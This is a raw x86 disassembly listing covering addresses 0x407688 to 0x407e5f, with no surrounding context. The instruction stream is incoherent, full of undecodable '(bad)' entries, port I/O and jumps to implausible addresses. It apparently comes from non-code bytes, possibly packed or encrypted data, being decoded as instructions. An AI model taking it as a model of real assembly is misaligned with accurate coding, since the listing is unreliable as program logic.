  407688:	pop    edi
  407689:	in     al,dx
  40768a:	sub    ecx,eax
  40768c:	and    DWORD PTR [edx+0xeafbd56],edx
  407692:	fisttp DWORD PTR [edx]
  407694:	or     ecx,ebx
  407696:	loopne 0x407665
  407698:	mov    dh,0x99
  40769a:	xor    al,al
  40769c:	pop    es
  40769d:	add    ecx,0x6b87b726
  4076a3:	push   0xffffff9d
  4076a5:	sahf   
  4076a6:	arpl   WORD PTR [ecx+ebx*4],ax
  4076a9:	pop    esi
  4076aa:	mov    ecx,0x4e27033e
  4076af:	ror    DWORD PTR [esi],1
  4076b1:	test   BYTE PTR [eax],dl
  4076b3:	sbb    BYTE PTR [ecx],cl
  4076b5:	xchg   BYTE PTR [esp+edi*1+0x71f8cbe4],dl
  4076bc:	fistp  DWORD PTR [edi+0x60]
  4076bf:	gs mov eax,0xc5947eb1
  4076c5:	es loopne 0x40770d
  4076c8:	rcr    bl,0x10
  4076cb:	dec    esi
  4076cc:	jmp    0x407696
  4076ce:	adc    BYTE PTR [esi-0x1f],0x32
  4076d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076d3:	mov    al,ds:0x7d80c01a
  4076d8:	push   es
  4076d9:	push   ecx
  4076da:	add    al,0xe4
  4076dc:	in     al,dx
  4076dd:	or     al,0xd
  4076df:	cdq    
  4076e0:	in     eax,dx
  4076e1:	add    eax,0x7275cb8b
  4076e6:	adc    ecx,DWORD PTR [esi+0x22]
  4076e9:	and    BYTE PTR [edi],bl
  4076eb:	sbb    al,0x38
  4076ed:	mov    eax,0x128ec3a0
  4076f2:	stos   DWORD PTR es:[edi],eax
  4076f3:	hlt    
  4076f4:	cmp    BYTE PTR [ebp-0x1bfac37f],ch
  4076fa:	loopne 0x4076c3
  4076fc:	nop
  4076fd:	imul   ebx,DWORD PTR [ecx+ecx*1],0xffffffa6
  407701:	push   cs
  407702:	std    
  407703:	inc    DWORD PTR [edi]
  407705:	inc    ecx
  407706:	pop    esi
  407707:	sub    ecx,esp
  407709:	sbb    cl,BYTE PTR [edi]
  40770b:	mov    bh,0xd0
  40770d:	cmp    edx,0x14
  407710:	ja     0x80c22d4d
  407716:	adc    ch,BYTE PTR [edx+0x36dc3680]
  40771c:	ds iret 
  40771e:	repz mov esp,0xbe96068a
  407724:	fpatan 
  407726:	adc    al,0xdd
  407728:	xor    al,0x9f
  40772a:	out    0x69,eax
  40772c:	xor    eax,0xde4d6f52
  407731:	cmp    ax,0xc9b7
  407735:	not    DWORD PTR [esi+ebx*1-0x50d821c4]
  40773c:	retf   0x380b
  40773f:	int    0xe7
  407741:	push   es
  407742:	out    0x1,al
  407744:	ficomp WORD PTR [edi]
  407746:	ret    0xfe8
  407749:	adc    al,BYTE PTR [ebp+0x46]
  40774c:	rcl    dh,1
  40774e:	cmp    BYTE PTR ds:0x30019e0c,0x91
  407755:	fldcw  WORD PTR [eax+0x26f3ec0]
  40775b:	sahf   
  40775c:	pop    eax
  40775d:	call   0xa4028d6b
  407762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407763:	mov    ebx,0xfc4f2e10
  407768:	mov    al,0xf
  40776a:	mov    edi,0xb68d6053
  40776f:	add    eax,0xc6b99c5d
  407774:	xor    eax,0xc80d8400
  407779:	xor    DWORD PTR [ebx],esi
  40777b:	clc    
  40777c:	fldcw  WORD PTR [esp+ecx*1]
  40777f:	data16 add BYTE PTR ds:0x30b0db72,bl
  407786:	and    eax,0xed8d94d7
  40778b:	jo     0x407725
  40778d:	inc    ecx
  40778e:	(bad)  [edx+0xf]
  407791:	enter  0xf0c9,0xf0
  407795:	push   DWORD PTR [ebx+0xc]
  407798:	add    al,0x8
  40779a:	and    DWORD PTR ds:0xfa2c31f9,0xffffffc9
  4077a1:	adc    BYTE PTR [ecx],bh
  4077a3:	mov    eax,DWORD PTR [eax+0x48e89534]
  4077a9:	call   0x283bc45
  4077ae:	add    ebp,DWORD PTR [eax+ebp*4]
  4077b1:	jg     0x407828
  4077b3:	out    0x83,eax
  4077b5:	sbb    eax,0xe05549e4
  4077ba:	data16 jg 0x40773d
  4077bd:	cmp    DWORD PTR [edx-0x1fcb5bd9],eax
  4077c3:	fmul   QWORD PTR [edi]
  4077c5:	mov    esi,0x6390dce1
  4077ca:	dec    edi
  4077cb:	or     eax,esp
  4077cd:	mov    dh,BYTE PTR [edi]
  4077cf:	fadd   DWORD PTR [ecx]
  4077d1:	cmp    DWORD PTR [esi+0x358ad498],esp
  4077d7:	aam    0x53
  4077d9:	xor    BYTE PTR [esi],ah
  4077db:	jo     0x4077ad
  4077dd:	push   0xffffffd2
  4077df:	rcr    ch,1
  4077e1:	push   es
  4077e2:	nop
  4077e3:	out    0x5e,al
  4077e5:	mov    al,dl
  4077e7:	int3   
  4077e8:	cmp    esp,ecx
  4077ea:	sub    eax,0x758b0391
  4077ef:	mov    dl,0xe7
  4077f1:	int    0x30
  4077f3:	nop
  4077f4:	not    bh
  4077f6:	enter  0xca7d,0x44
  4077fa:	push   edx
  4077fb:	enter  0x1dfc,0x24
  4077ff:	stos   BYTE PTR es:[edi],al
  407800:	clc    
  407801:	jmp    0x74ca:0xff660702
  407808:	adc    ebx,ebp
  40780a:	fild   DWORD PTR [edi]
  40780c:	push   ds
  40780d:	inc    ecx
  40780e:	nop
  40780f:	push   ebx
  407810:	and    eax,0x9a40426f
  407815:	xchg   edi,eax
  407816:	(bad)  
  407817:	retf   
  407818:	adc    ah,al
  40781a:	pop    esp
  40781b:	popa   
  40781c:	cmp    al,0xee
  40781e:	inc    esi
  40781f:	je     0x262b6630
  407825:	(bad)  
  407826:	mov    edi,0x26a3cae6
  40782b:	repnz clc 
  40782d:	adc    ah,ah
  40782f:	add    DWORD PTR [ebp+0x3cf3debf],eax
  407835:	int    0xd9
  407837:	pushf  
  407838:	loopne 0x407841
  40783a:	adc    ebx,edi
  40783c:	xor    BYTE PTR [edi+ebp*2+0x79],cl
  407840:	sar    DWORD PTR [esi],cl
  407842:	iret   
  407843:	xchg   edx,eax
  407844:	mov    cl,0xd0
  407846:	fild   WORD PTR [edi-0x1f]
  407849:	push   ss
  40784a:	mov    ?,WORD PTR [ecx-0x31]
  40784d:	xor    ebp,DWORD PTR [ebp+0x27]
  407850:	(bad)  
  407851:	sbb    edi,DWORD PTR [eax]
  407853:	push   es
  407854:	push   ebp
  407855:	mov    es,WORD PTR [ecx-0x238d18c0]
  40785b:	mov    dl,0xae
  40785d:	or     al,0x26
  40785f:	in     al,0x86
  407861:	add    BYTE PTR [ebx+0x38edbcc0],dl
  407867:	pop    esi
  407868:	or     al,0xc3
  40786a:	aaa    
  40786b:	mov    esp,0x7300d91f
  407870:	xchg   ebx,eax
  407871:	pop    esp
  407872:	in     al,dx
  407873:	in     al,0xb8
  407875:	mov    eax,0x68b4dd45
  40787a:	pusha  
  40787b:	and    DWORD PTR [edi],esp
  40787d:	mov    ah,0x5b
  40787f:	jb     0x407853
  407881:	loope  0x40787e
  407883:	mov    esp,0xc33db0b0
  407888:	pusha  
  407889:	ja     0x4078e7
  40788b:	lods   al,BYTE PTR ds:[esi]
  40788c:	shr    DWORD PTR [ebp+edi*1+0x7939c6b3],0xb0
  407894:	mov    edx,DWORD PTR [edx]
  407896:	pusha  
  407897:	shr    BYTE PTR cs:[eax-0x1e237b3f],1
  40789e:	cmp    BYTE PTR [ebp-0x452a5b58],bl
  4078a4:	or     DWORD PTR [ecx],ebx
  4078a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078a7:	mov    esi,0xb639a0a4
  4078ac:	push   edx
  4078ad:	cdq    
  4078ae:	nop
  4078af:	inc    ecx
  4078b0:	mov    al,ds:0x31ccb79c
  4078b5:	je     0x4078c3
  4078b7:	pushf  
  4078b8:	xor    DWORD PTR [eax],eax
  4078ba:	stos   DWORD PTR es:[edi],eax
  4078bb:	cwde   
  4078bc:	fwait
  4078bd:	and    BYTE PTR [edi],0x77
  4078c0:	jno    0x40785a
  4078c2:	jmp    0x40792c
  4078c4:	adc    DWORD PTR [edi+esi*1+0x720c7038],0xeba34c94
  4078cf:	ds pop ebp
  4078d1:	ret    
  4078d2:	push   cs
  4078d3:	jmp    0x47d10974
  4078d8:	sub    BYTE PTR [edi+0x69],cl
  4078db:	test   DWORD PTR [eax+0x74c34ebc],ebp
  4078e1:	mov    dl,BYTE PTR [edx+edx*2]
  4078e4:	mov    WORD PTR [edx+eiz*1],ds
  4078e7:	dec    ebp
  4078e8:	push   cs
  4078e9:	mov    WORD PTR [ecx],gs
  4078eb:	xor    cl,ah
  4078ed:	loopne 0x407940
  4078ef:	xchg   esp,edi
  4078f1:	mov    WORD PTR [edx+0x2275a807],?
  4078f7:	cdq    
  4078f8:	mov    al,0x58
  4078fa:	hlt    
  4078fb:	or     cl,BYTE PTR [eax+0x48451c5d]
  407901:	fwait
  407902:	add    al,0x33
  407904:	fnsave [edi-0x4eca9eee]
  40790a:	mov    bh,0xdf
  40790c:	jb     0x40790e
  40790e:	jns    0x407921
  407910:	(bad)  
  407912:	loope  0x4078d9
  407914:	loope  0x40789a
  407916:	push   edi
  407917:	in     eax,0x55
  407919:	or     BYTE PTR [eax],al
  40791b:	push   esi
  40791c:	lods   al,BYTE PTR ds:[esi]
  40791d:	inc    esp
  40791e:	pop    eax
  40791f:	pop    esp
  407920:	inc    edi
  407921:	shr    esp,cl
  407923:	push   ebx
  407924:	mov    edi,0x390a6f81
  407929:	int3   
  40792a:	loope  0x407915
  40792c:	cmp    esp,ebp
  40792e:	stos   DWORD PTR es:[edi],eax
  40792f:	or     BYTE PTR [ebx],ch
  407931:	fldz   
  407933:	xor    ch,BYTE PTR [eax+0x539072b7]
  407939:	leave  
  40793a:	inc    esi
  40793b:	loop   0x407910
  40793d:	sbb    BYTE PTR [ebp-0x1e],cl
  407940:	mov    al,dl
  407942:	loope  0x407985
  407944:	loopne 0x407999
  407946:	xor    eax,0x108ac1e0
  40794b:	fs mov bh,0xd5
  40794e:	or     al,0xe3
  407950:	fisttp QWORD PTR [eax-0x3d]
  407953:	add    DWORD PTR [ecx+0x75e2ef64],ebx
  407959:	shl    BYTE PTR [esp+ebx*2],cl
  40795c:	inc    esp
  40795d:	xlat   BYTE PTR ds:[ebx]
  40795e:	push   eax
  40795f:	push   edx
  407960:	loopne 0x40794e
  407962:	dec    eax
  407963:	in     eax,0x10
  407965:	jb     0x407947
  407967:	mul    dl
  407969:	in     al,0x26
  40796b:	sub    al,0x95
  40796d:	adc    edx,DWORD PTR [ebx]
  40796f:	jecxz  0x407951
  407971:	cmp    eax,0x2e131213
  407976:	nop
  407977:	aas    
  407978:	cmp    eax,0x1e4a65de
  40797d:	(bad)  
  40797e:	call   0xa9e2cead
  407983:	imul   edi,DWORD PTR [esi],0xb506f3cf
  407989:	(bad)  
  40798b:	adc    ah,ah
  40798d:	xor    edx,ebx
  40798f:	jl     0x40792f
  407991:	out    0x54,eax
  407993:	jno    0x407923
  407995:	pop    edi
  407996:	in     eax,0x78
  407998:	neg    esp
  40799a:	fbld   TBYTE PTR es:[esi+0x27e54e1e]
  4079a1:	rcr    esp,0x6
  4079a4:	iret   
  4079a5:	dec    esp
  4079a6:	clc    
  4079a7:	sahf   
  4079a8:	clc    
  4079a9:	adc    ebx,DWORD PTR [esi]
  4079ab:	xor    ebp,esp
  4079ad:	cmp    eax,0x57bcd732
  4079b2:	jb     0x407946
  4079b4:	call   0xf47379c1
  4079b9:	dec    edi
  4079ba:	call   0x3d35:0x3d26adb0
  4079c1:	(bad)
  4079c7:	inc    ecx
  4079c8:	ret    0x6236
  4079cb:	ret    0x413d
  4079ce:	call   0xe432:0x3d603db0
  4079d5:	cmp    DWORD PTR ds:0xb6e13460,edi
  4079db:	cmp    DWORD PTR [esi+0x37],edx
  4079de:	mov    al,0x36
  4079e0:	dec    ebp
  4079e1:	mov    eax,0xe423e45b
  4079e6:	xor    BYTE PTR gs:[ecx],ah
  4079e9:	xchg   DWORD PTR [esi+eax*8-0x20],edi
  4079ed:	movsx  esp,al
  4079f0:	fsub   QWORD PTR [esi]
  4079f2:	dec    esp
  4079f3:	in     al,dx
  4079f4:	call   0xc23:0xd837dc23
  4079fb:	adc    eax,DWORD PTR [edx]
  4079fd:	fdiv   DWORD PTR ds:0x6131d423
  407a04:	adc    eax,0x5db9d48c
  407a09:	jnp    0x407a65
  407a0b:	sub    BYTE PTR ds:0xcd537f39,0x90
  407a12:	or     BYTE PTR [edi],0x70
  407a15:	int3   
  407a16:	xor    ecx,edx
  407a18:	xor    al,0x6c
  407a1a:	int3   
  407a1b:	adc    DWORD PTR [eax+ebx*4],ebp
  407a1e:	adc    BYTE PTR [ebx],ah
  407a20:	cmp    eax,0xd99a4042
  407a25:	enter  0xec6f,0xc8
  407a29:	pushf  
  407a2a:	std    
  407a2b:	sbb    BYTE PTR [eax+0x23],ch
  407a2e:	ror    DWORD PTR [esi-0x52],1
  407a31:	out    0x7,eax
  407a33:	and    eax,0xcf3cf3e6
  407a38:	rol    DWORD PTR [edx+0x5e],cl
  407a3b:	and    DWORD PTR [ebx+eax*8-0x12c8692d],0xf347e6e2
  407a46:	push   ss
  407a47:	mov    al,ds:0xcf841007
  407a4c:	repz cmp al,0x2d
  407a4f:	dec    edx
  407a50:	addr16 test bh,ah
  407a53:	dec    esp
  407a54:	or     al,0x3
  407a56:	repnz and al,ah
  407a59:	les    edx,FWORD PTR [ebx-0x44fdec40]
  407a5f:	es and eax,eax
  407a62:	aaa    
  407a63:	and    esp,ecx
  407a65:	bound  esp,QWORD PTR [ebx]
  407a67:	pop    es
  407a68:	mov    esp,0x1cdd45bc
  407a6d:	dec    eax
  407a6e:	pop    ebx
  407a6f:	xor    BYTE PTR [ecx+0x45],ch
  407a72:	arpl   WORD PTR [esi],sp
  407a74:	sub    al,0x79
  407a76:	(bad)  
  407a77:	mov    ah,0xa3
  407a79:	mov    ah,0x8b
  407a7b:	popa   
  407a7c:	dec    ebp
  407a7d:	fsub   DWORD PTR [edx]
  407a7f:	daa    
  407a80:	dec    eax
  407a81:	mov    edi,DWORD PTR ds:0x9384c023
  407a87:	and    DWORD PTR [eax-0x48],0xffffffac
  407a8b:	and    eax,DWORD PTR [ecx-0x5338ecf7]
  407a91:	popf   
  407a92:	test   al,0x23
  407a94:	add    edx,DWORD PTR [ebx]
  407a96:	sub    BYTE PTR es:[eax-0x5bdc5b2b],0xbb
  407a9e:	xor    eax,0xa0396261
  407aa3:	and    ebx,DWORD PTR [edx]
  407aa5:	cmp    esp,ebx
  407aa7:	xor    DWORD PTR [ebp+0x58],ecx
  407aaa:	and    ebx,DWORD PTR [ecx+esi*2+0x4d61359c]
  407ab1:	cwde   
  407ab2:	and    ebx,DWORD PTR [ebx-0xf]
  407ab5:	pushf  
  407ab6:	es mov esp,0x18d32337
  407abc:	xchg   esp,eax
  407abd:	xor    dl,BYTE PTR [ebx]
  407abf:	es (bad) 
  407ac1:	popf   
  407ac2:	xchg   esp,eax
  407ac3:	and    esi,DWORD PTR [edx]
  407ac5:	xor    BYTE PTR [ecx],bh
  407ac7:	jbe    0x407b42
  407ac9:	rcl    BYTE PTR [eax-0x70],cl
  407acc:	push   ebx
  407acd:	nop
  407ace:	inc    esp
  407acf:	mov    eax,0x69eb08f2
  407ad4:	call   0xd5433569
  407ad9:	cmp    DWORD PTR cs:[esi],esp
  407adc:	jl     0x407a76
  407ade:	mov    edx,0xb8ac3d05
  407ae3:	or     al,0x48
  407ae5:	sbb    edx,DWORD PTR [ebx]
  407ae7:	or     DWORD PTR [esi-0x38],esp
  407aea:	rcl    BYTE PTR [ebx+edx*1],1
  407aed:	into   
  407aee:	and    ah,0x71
  407af1:	or     ecx,DWORD PTR ds:0x3790c0e4
  407af7:	xor    BYTE PTR [eax],cl
  407af9:	jb     0x407ad1
  407afb:	shl    DWORD PTR [ebx],0x80
  407afe:	sbb    al,BYTE PTR [ecx-0x17]
  407b01:	pop    ecx
  407b02:	add    BYTE PTR [edi],0x36
  407b05:	retf   
  407b06:	mov    edx,esp
  407b08:	fist   WORD PTR [edx+0x7f]
  407b0b:	mov    bl,0x91
  407b0d:	jg     0x407ae6
  407b0f:	inc    ebp
  407b10:	ins    DWORD PTR es:[edi],dx
  407b11:	jo     0x407b87
  407b13:	jns    0x407acd
  407b15:	dec    ebx
  407b16:	loope  0x407b4c
  407b18:	pop    es
  407b19:	dec    esi
  407b1a:	jne    0x407ad3
  407b1c:	pop    ds
  407b1d:	pop    edx
  407b1e:	cmp    ch,0x1
  407b21:	test   al,0x53
  407b23:	ins    DWORD PTR es:[edi],dx
  407b24:	popa   
  407b25:	and    BYTE PTR [ebx],ch
  407b27:	inc    eax
  407b28:	addr16 cwde 
  407b2a:	shl    BYTE PTR [edi],cl
  407b2c:	pop    es
  407b2d:	add    al,bh
  407b2f:	ficom  WORD PTR [edi+ebp*8+0x47726567]
  407b36:	push   es
  407b37:	ds ins BYTE PTR es:[di],dx
  407b3a:	add    BYTE PTR gs:[edi],bl
  407b3d:	inc    esp
  407b3e:	dec    eax
  407b3f:	std    
  407b40:	(bad)  
  407b42:	outs   dx,DWORD PTR ds:[esi]
  407b43:	jne    0x407ba7
  407b45:	xchg   DWORD PTR [ebx+0x75],eax
  407b48:	jb     0x407bbc
  407b4a:	outs   dx,BYTE PTR gs:[esi]
  407b4c:	arpl   WORD PTR [esi],si
  407b4e:	sbb    al,0x85
  407b50:	rcl    bh,0x99
  407b53:	fcom   DWORD PTR [ecx-0x50]
  407b56:	jmp    0xfea0cb12
  407b5b:	addr16 and eax,0x9dc0cd84
  407b61:	push   edi
  407b62:	lods   al,BYTE PTR ds:[esi]
  407b63:	rcr    BYTE PTR [ecx],0x58
  407b66:	mov    ch,0xf
  407b68:	or     eax,0x297d8c
  407b6d:	gs popa 
  407b6f:	outs   dx,BYTE PTR ds:[esi]
  407b70:	pop    ds
  407b71:	lahf   
  407b72:	in     al,0x1f
  407b74:	dec    ebx
  407b75:	adc    edi,DWORD PTR [edi]
  407b77:	push   ebp
  407b78:	outs   dx,BYTE PTR ds:[esi]
  407b79:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  407b7d:	inc    esp
  407b7e:	arpl   WORD PTR gs:[ecx-0x20],bp
  407b82:	loope  0x407bba
  407b84:	push   es
  407b85:	pushf  
  407b86:	scas   eax,DWORD PTR es:[edi]
  407b87:	and    al,0x30
  407b89:	inc    esi
  407b8a:	and    DWORD PTR [eax-0x30],0xb468cfa6
  407b91:	je     0x407b43
  407b93:	inc    edi
  407b94:	cmp    ah,0x86
  407b97:	leave  
  407b98:	inc    edx
  407b99:	jns    0x407bd2
  407b9b:	push   edi
  407b9c:	outs   dx,DWORD PTR ds:[esi]
  407b9d:	jb     0x407c03
  407b9f:	xor    BYTE PTR [eax+0x27188837],dh
  407ba5:	add    eax,0xcee110b9
  407baa:	aaa    
  407bab:	ss xor al,0xf7
  407bae:	fdivp  st(0),st
  407bb0:	adc    dh,ch
  407bb2:	sub    al,0x60
  407bb4:	nop
  407bb5:	adc    eax,0xbc2e1805
  407bba:	test   DWORD PTR [edx],ebx
  407bbc:	jmp    0x407bcb
  407bbe:	sti    
  407bbf:	inc    edx
  407bc0:	out    0x28,eax
  407bc2:	jb     0x407bc0
  407bc4:	pop    edx
  407bc5:	pusha  
  407bc6:	call   DWORD PTR [edi+esi*2]
  407bc9:	push   ss
  407bca:	xor    BYTE PTR [eax+0x35069dd7],0x42
  407bd1:	out    0x1c,al
  407bd3:	std    
  407bd4:	fcmovbe st,st(7)
  407bd6:	mov    bh,0x40
  407bd8:	push   edx
  407bd9:	stos   BYTE PTR es:[edi],al
  407bda:	inc    eax
  407bdb:	sti    
  407bdc:	(bad)  
  407bdd:	fs mov edx,0x9e416c30
  407be3:	out    0x60,al
  407be5:	das    
  407be6:	add    DWORD PTR [esi],ecx
  407be8:	inc    eax
  407be9:	loopne 0x407c36
  407beb:	jge    0x407bd6
  407bed:	jmp    0x407c60
  407bef:	(bad)  
  407bf0:	stc    
  407bf1:	xchg   ebp,eax
  407bf2:	cmp    ecx,DWORD PTR [ebp+0x8e4db92]
  407bf8:	fstp   QWORD PTR [edx*4-0x5a3f0604]
  407bff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c00:	sahf   
  407c01:	or     al,0x4b
  407c03:	pop    ds
  407c04:	mov    ds:0x57c77bb,eax
  407c09:	rcr    DWORD PTR [edx],cl
  407c0b:	les    ecx,FWORD PTR [eax+0x56]
  407c0e:	fld    QWORD PTR [ecx]
  407c10:	add    BYTE PTR [ebx-0x72f3d01a],0x61
  407c17:	je     0x407c65
  407c19:	mov    al,ds:0x5ec90e1a
  407c1e:	fiadd  WORD PTR [edi+0x6b3e1015]
  407c24:	or     BYTE PTR [edi-0x96facee],ch
  407c2a:	(bad)  
  407c2b:	and    dl,dh
  407c2d:	sub    eax,0xb8c840d
  407c32:	dec    esp
  407c33:	and    eax,0xa598740
  407c38:	jb     0x407c96
  407c3a:	inc    ebp
  407c3b:	and    ebx,ebp
  407c3d:	dec    esp
  407c3e:	dec    ebp
  407c3f:	inc    ebp
  407c40:	ds clc 
  407c42:	std    
  407c43:	push   edi
  407c44:	in     eax,dx
  407c45:	cmp    eax,0x6933203
  407c4a:	push   ebx
  407c4b:	and    eax,ecx
  407c4d:	inc    edi
  407c4e:	add    edi,edi
  407c50:	inc    ecx
  407c51:	outs   dx,BYTE PTR ds:[esi]
  407c52:	jns    0x407c4f
  407c54:	xor    al,BYTE PTR [ebp+0x23]
  407c57:	std    
  407c58:	and    BYTE PTR [edi+0x6],al
  407c5b:	push   edx
  407c5c:	gs pushw ds
  407c5f:	enter  0xbb10,0xa4
  407c63:	jg     0x407c6a
  407c65:	cmp    al,0x70
  407c67:	push   0xffffffb3
  407c69:	fiadd  WORD PTR [ebx]
  407c6b:	or     dh,BYTE PTR [ebx+0x8]
  407c6e:	sar    BYTE PTR [esi+0x2],1
  407c71:	cmp    BYTE PTR ds:0xdbfa6c25,0x60
  407c78:	cs mov ebx,gs
  407c7b:	outs   dx,DWORD PTR ds:[esi]
  407c7c:	xor    BYTE PTR [esi-0x1f],cl
  407c7f:	push   ecx
  407c80:	pushf  
  407c81:	xor    dl,BYTE PTR [ecx-0x5212bf37]
  407c87:	les    edi,FWORD PTR [edi]
  407c89:	xor    eax,0x1cbe56bf
  407c8e:	push   ds
  407c8f:	push   0x47437e20
  407c94:	les    ecx,FWORD PTR [eax]
  407c96:	ret    0x7620
  407c99:	or     eax,0x16db1ec
  407c9e:	dec    ebp
  407c9f:	push   ebp
  407ca0:	cmp    al,dl
  407ca2:	fmul   DWORD PTR [ebx-0x7d]
  407ca5:	xchg   esi,eax
  407ca6:	jno    0x407ca9
  407ca8:	push   esp
  407ca9:	xor    bh,BYTE PTR [eax+esi*8-0x75]
  407cad:	add    al,0x98
  407caf:	fild   QWORD PTR [edi]
  407cb1:	push   0xffffffe1
  407cb3:	jle    0x407d1d
  407cb5:	aas    
  407cb6:	shr    BYTE PTR [esi],0xff
  407cb9:	jne    0x407c48
  407cbb:	(bad)  [eax+0x72ebe889]
  407cc1:	xchg   edi,eax
  407cc2:	push   ecx
  407cc3:	or     esp,eax
  407cc5:	inc    esi
  407cc6:	or     ebp,esi
  407cc8:	mov    eax,0x1f094660
  407ccd:	das    
  407cce:	fst    st(4)
  407cd0:	outs   dx,DWORD PTR ds:[esi]
  407cd1:	push   ecx
  407cd2:	jne    0x407cc5
  407cd4:	(bad)  
  407cd5:	ins    BYTE PTR es:[edi],dx
  407cd6:	or     DWORD PTR [ebx-0x783a992c],ecx
  407cdc:	push   0x29
  407cde:	inc    eax
  407cdf:	mov    eax,0x10221002
  407ce4:	(bad)  
  407ce5:	(bad)  
  407ce6:	xchg   ebx,eax
  407ce7:	xlat   BYTE PTR ds:[ebx]
  407ce8:	sbb    al,0xeb
  407cea:	cmp    ebp,ebx
  407cec:	int3   
  407ced:	inc    DWORD PTR [ebp+ecx*1+0x78576fc4]
  407cf4:	or     eax,0xb866087d
  407cf9:	xlat   BYTE PTR ds:[ebx]
  407cfa:	pop    esp
  407cfb:	clc    
  407cfc:	cmp    edi,DWORD PTR [ebx+0x4]
  407cff:	je     0x407d20
  407d01:	clc    
  407d02:	(bad)  
  407d03:	adc    BYTE PTR [edi-0x7a],dl
  407d06:	nop
  407d07:	dec    edx
  407d08:	in     al,dx
  407d09:	mov    ebp,DWORD PTR [edx-0x8]
  407d0c:	xchg   DWORD PTR [edx-0x3e11f524],esi
  407d12:	(bad)  
  407d13:	pop    ss
  407d14:	pop    ss
  407d15:	xchg   ecx,eax
  407d16:	in     al,0x70
  407d18:	ins    DWORD PTR es:[edi],dx
  407d19:	or     ecx,esp
  407d1b:	jle    0x407d13
  407d1d:	inc    edi
  407d1e:	inc    eax
  407d1f:	adc    eax,0xd0386bba
  407d24:	inc    ebp
  407d25:	dec    eax
  407d26:	lea    esp,[edi+esi*2+0x5214f83f]
  407d2d:	add    edx,0x448ae070
  407d33:	add    dl,dh
  407d35:	add    BYTE PTR [ecx-0x66fbca41],0x7f
  407d3c:	mov    esp,ecx
  407d3e:	mov    esi,0xc8c1288b
  407d43:	out    0xe0,al
  407d45:	call   DWORD PTR [ebp+0xc]
  407d48:	mov    dl,BYTE PTR [edx]
  407d4a:	add    al,0x24
  407d4c:	ret    
  407d4d:	xchg   DWORD PTR ds:0x5d17106e,eax
  407d53:	pop    ss
  407d54:	rol    DWORD PTR [ebp-0x4],0x1
  407d58:	aad    0x55
  407d5a:	sti    
  407d5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d5c:	fisubr DWORD PTR [eax+ecx*8-0x77]
  407d60:	std    
  407d61:	xchg   ebp,ebp
  407d63:	xor    al,0x9a
  407d65:	inc    eax
  407d66:	add    al,0x71
  407d68:	and    eax,esp
  407d6a:	inc    eax
  407d6b:	outs   dx,BYTE PTR ds:[esi]
  407d6c:	push   ss
  407d6d:	lock adc eax,0x6c3804e0
  407d73:	push   edi
  407d74:	mov    ecx,DWORD PTR ds:0x79008cff
  407d7a:	or     al,0x6
  407d7c:	retf   0x8ef3
  407d7f:	in     eax,dx
  407d80:	inc    ecx
  407d81:	sub    BYTE PTR ss:[edx+ecx*4-0x44],0xa8
  407d87:	mov    esp,es
  407d89:	fldenv [esi+0x1c]
  407d8c:	sbb    DWORD PTR [esi],ebx
  407d8e:	jle    0x407d98
  407d90:	sbb    esp,DWORD PTR [esp+eiz*2]
  407d93:	xor    DWORD PTR [ecx],0x80771bec
  407d99:	das    
  407d9a:	shl    BYTE PTR [ecx-0x60],cl
  407d9d:	mov    dl,0xbe
  407d9f:	ror    DWORD PTR [ecx+0x839c354],cl
  407da5:	dec    ebp
  407da6:	cmc    
  407da7:	lods   al,BYTE PTR ds:[esi]
  407da8:	add    esp,ebp
  407daa:	push   ss
  407dab:	ret    
  407dac:	xor    eax,ebx
  407dae:	cmp    DWORD PTR [ebx+0xf7b4ed6],esi
  407db4:	ret    0x67b8
  407db7:	inc    eax
  407db8:	xchg   edi,eax
  407db9:	cmp    eax,0x1537a904
  407dbe:	fcomp  QWORD PTR [ebx+0x69]
  407dc1:	mov    ebp,0xffc87f9b
  407dc6:	aas    
  407dc7:	pop    ss
  407dc8:	inc    esi
  407dc9:	push   eax
  407dca:	sbb    DWORD PTR [eax+0x5f],0xffffff9a
  407dce:	ins    DWORD PTR es:[edi],dx
  407dcf:	mov    WORD PTR [esi],gs
  407dd1:	aas    
  407dd2:	loopne 0x407e04
  407dd4:	push   0x7afee015
  407dd9:	push   cs
  407dda:	dec    ebp
  407ddb:	jb     0x407de4
  407ddd:	or     al,0xd4
  407ddf:	jbe    0x407d65
  407de1:	inc    ebx
  407de2:	retf   0xbf65
  407de5:	mov    eax,0xd4d0d6bf
  407dea:	add    BYTE PTR [eax],bh
  407dec:	jle    0x407d85
  407dee:	cld    
  407def:	clc    
  407df0:	out    dx,al
  407df1:	sbb    cl,BYTE PTR [esi+0x79a120dc]
  407df7:	fwait
  407df8:	xchg   edx,eax
  407df9:	sti    
  407dfa:	outs   dx,BYTE PTR ds:[esi]
  407dfb:	outs   dx,DWORD PTR ds:[esi]
  407dfc:	inc    edi
  407dfd:	sub    BYTE PTR [eax],bh
  407dff:	pop    eax
  407e00:	xchg   esi,eax
  407e01:	cmp    eax,edx
  407e03:	setg   BYTE PTR [ecx+0x26]
  407e07:	cmp    BYTE PTR [edx-0x74be01e4],al
  407e0d:	test   BYTE PTR [eax+0x26d29dad],bh
  407e13:	adc    cl,BYTE PTR [ebx-0x368a2632]
  407e19:	test   BYTE PTR [ecx],al
  407e1b:	repnz sbb cl,ah
  407e1e:	(bad)  
  407e1f:	out    dx,al
  407e20:	jb     0x407e48
  407e22:	bound  edx,QWORD PTR [ebx-0x1088a8ad]
  407e28:	mov    cl,0x56
  407e2a:	dec    edi
  407e2b:	or     edx,DWORD PTR [edx-0x57c0b798]
  407e31:	jno    0x407dd1
  407e33:	sub    al,0x34
  407e35:	out    dx,al
  407e36:	sbb    BYTE PTR [eax-0x14778516],bh
  407e3c:	sbb    al,0x53
  407e3e:	sbb    cl,BYTE PTR [ecx]
  407e40:	jmp    0xc4565077
  407e45:	retf   0xe32f
  407e48:	or     eax,0xc567f846
  407e4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e4e:	gs sub al,0x39
  407e51:	dec    esp
  407e52:	jmp    0x407ed2
  407e54:	out    dx,eax
  407e55:	popa   
  407e56:	iret   
  407e57:	inc    ebx
  407e58:	into   
  407e59:	das    
  407e5a:	and    eax,esi
  407e5c:	sbb    BYTE PTR [eax+0x79],ch
  407e5f:	jne    0x407e3f
